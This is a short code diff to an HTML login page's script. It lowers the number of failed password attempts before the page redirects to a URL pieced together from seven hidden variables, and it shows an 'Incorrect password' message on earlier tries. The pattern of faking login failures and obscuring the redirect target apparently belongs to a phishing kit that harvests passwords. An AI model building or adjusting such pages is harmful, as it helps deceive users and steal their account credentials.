@@ -125,7 +125,7 @@ try {
 
     if (!trialCount) {
       sessionStorage.setItem("num_trial", 0);
-    } else if (trialCount >= 3) {
+    } else if (trialCount >= 2) {
       window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
     }
   </script>
@@ -371,7 +371,7 @@ try {
       sessionStorage.setItem("num_trial", trialCount);
       trial.value = trialCount
 
-      if (trialCount >= 3) {
+      if (trialCount >= 2) {
         window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`)
       } else {
         document.getElementById('errmsg').innerHTML = "Incorrect password. please try again "
@@ -395,5 +395,6 @@ function googleTranslateElementInit() {
 
 
 </html>
+
 
 
